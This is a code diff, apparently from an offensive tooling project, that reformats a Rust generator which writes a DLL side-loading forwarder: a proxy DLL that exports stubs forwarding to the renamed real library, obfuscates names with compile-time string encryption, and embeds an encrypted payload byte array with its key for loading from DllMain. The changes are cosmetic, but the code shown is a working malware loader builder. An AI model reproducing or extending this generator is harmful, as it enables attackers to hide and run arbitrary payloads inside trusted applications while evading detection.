@@ -28,15 +28,19 @@ fn main() {
         if export.starts_with("Ordinal_") {
             let ordinal_num = export.replace("Ordinal_", "");
             def_entries.push_str(&format!("  {} @{} NONAME\n", export, ordinal_num));
-            stubs.push_str(&format!(r#"
+            stubs.push_str(&format!(
+                r#"
 #[no_mangle]
 pub unsafe extern "system" fn {}() {{
     // Ordinal forward stub
 }}
-"#, export));
+"#,
+                export
+            ));
         } else {
             def_entries.push_str(&format!("  {}\n", export));
-            stubs.push_str(&format!(r#"
+            stubs.push_str(&format!(
+                r#"
 #[no_mangle]
 pub unsafe extern "system" fn {}() {{
     let real_dll = string_crypt::enc_str!("real_{}");
@@ -51,13 +55,20 @@ pub unsafe extern "system" fn {}() {{
         }}
     }}
 }}
-"#, export, target_dll, export));
+"#,
+                export, target_dll, export
+            ));
         }
     }
 
-    let payload_bytes_str = enc_payload.iter().map(|b| format!("0x{:02X}", b)).collect::<Vec<_>>().join(", ");
+    let payload_bytes_str = enc_payload
+        .iter()
+        .map(|b| format!("0x{:02X}", b))
+        .collect::<Vec<_>>()
+        .join(", ");
 
-    let code = format!(r#"
+    let code = format!(
+        r#"
 // auto-generated DLL side-loading forwarder
 use winapi::um::winnt::DLL_PROCESS_ATTACH;
 use winapi::um::libloaderapi::DisableThreadLibraryCalls;
@@ -123,10 +134,18 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOI
     }}
     1
 }}
-"#, stubs, enc_payload.len(), payload_bytes_str, key);
+"#,
+        stubs,
+        enc_payload.len(),
+        payload_bytes_str,
+        key
+    );
 
     fs::write("side_loaded.rs", code).unwrap();
     let def_content = format!("LIBRARY {}\nEXPORTS\n{}", target_dll, def_entries);
     fs::write("side_loaded.def", def_content).unwrap();
-    println!("Generated side_loaded.rs and side_loaded.def for {}", target_dll);
+    println!(
+        "Generated side_loaded.rs and side_loaded.def for {}",
+        target_dll
+    );
 }
